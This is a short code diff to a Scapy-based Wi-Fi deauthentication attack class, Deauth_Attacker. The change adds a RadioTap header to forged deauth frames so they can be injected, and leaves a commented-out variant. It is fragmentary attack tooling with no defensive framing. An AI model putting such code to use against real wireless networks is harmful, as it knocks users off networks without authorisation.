@@ -266,7 +266,8 @@ class Deauth_Attacker():
         pkts = []
         
         for reason in reasons:
-            packet = Dot11(addr1=mac_dst, addr2=mac_src, addr3=mac_src) / Dot11Deauth(reason=reason)
+            packet = RadioTap() / Dot11(addr1=mac_dst, addr2=mac_src, addr3=mac_src) / Dot11Deauth(reason=reason)
+            #frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
             console.print(packet)
             pkts.append(packet)
 
